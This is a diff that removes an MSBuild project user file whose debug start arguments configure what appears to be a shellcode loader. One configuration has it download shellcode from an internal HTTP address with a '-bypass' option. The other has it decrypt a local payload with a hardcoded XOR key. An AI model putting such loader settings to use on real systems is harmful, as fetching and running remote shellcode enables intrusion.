@@ -1,9 +1,0 @@
-﻿<?xml version="1.0" encoding="utf-8"?>
-<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
-    <StartArguments>-m 5 -shellcode -location http://192.168.122.1/shell.txt -bypass</StartArguments>
-  </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
-    <StartArguments>-m=5 -shellcode -location=C:\\Users\\root\\enc.txt -decrypt-xor -pass=b14ca5898a4e4133bbce2ea2315a1916 -bypass</StartArguments>
-  </PropertyGroup>
-</Project>
